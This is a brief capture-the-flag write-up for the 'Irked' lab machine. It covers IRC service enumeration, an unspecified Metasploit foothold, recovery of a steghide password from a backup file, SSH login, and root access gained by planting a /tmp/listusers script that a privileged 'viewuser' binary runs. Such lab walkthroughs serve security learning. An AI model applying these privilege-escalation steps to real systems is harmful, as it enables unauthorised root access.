# 🖇 Irked

## Enumeration

We found port 6697 running Unrealized with version BTW 2-4.

Then we search for an exploit and we get metasploit exploit which then we search google for the same and we find an exploit and get Initial Foothold.

## Privilege Escalation

### Steg

We find and bash history file with out put

```
ircd@irked:/home/djmardov/Documents$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

We search for steg and we find that it helps with encrypting hidden content.

In the enumeration phase we see that  there is an angry emoji image on the website.

We use steg to extract any hidden info

```
steghide info irked.jpg
```

We see there is an pass.txt file

```
steghide extract -sf irked.jpg
```

Then it asks for an password for which we can use the text we extracted from backup.

Then wee ssh using the uname and passwd and get the user.txt

### Priv To Root

After Some enumeration we see viewuser in usr/bin folder

```
djmardov@irked:/usr/bin$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0 2020-05-03 13:04 (:0)
djmardov pts/0 2020-05-03 13:05 (10.10.14.37)
sh: 1: /tmp/listusers: not found
```

We see /tmp/listusers not found

So we create an file listusers in tmp folder with content

```
!bin/sh
bash
```

the nrun viewuser again / and we get root shell
